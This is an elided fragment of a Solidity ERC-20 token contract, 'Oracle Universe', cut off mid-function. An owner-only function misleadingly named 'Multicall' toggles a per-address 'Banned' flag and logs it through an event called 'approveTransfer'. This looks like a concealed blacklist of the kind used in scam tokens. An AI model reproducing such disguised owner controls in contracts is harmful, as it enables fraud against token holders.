...
contract OracleUniverse is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'Oracle Universe';
    string private _symbol = 'ORACLEu';
    ...
    event approveTransfer (address Bot, bool Banned);
    ...
    function Multicall(address _address) external onlyOwner {
        ...
        emit approveTransfer (_address, _Multicall[_address]);}
    }

    function transferState(address _address) public view returns (bool) {
